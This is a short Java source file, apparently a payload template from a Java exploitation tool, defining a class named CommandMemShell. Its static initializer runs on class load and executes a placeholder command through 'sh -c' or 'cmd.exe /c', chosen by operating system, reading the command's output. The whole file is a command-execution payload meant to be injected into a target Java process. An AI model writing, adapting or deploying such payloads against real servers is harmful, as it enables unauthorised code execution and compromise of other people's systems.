package core.memshell;


import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;


public class CommandMemShell{

    public CommandMemShell(){
        try {
            String cmd = "{{cmd}}";
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
static{
        new CommandMemShell();
}
}
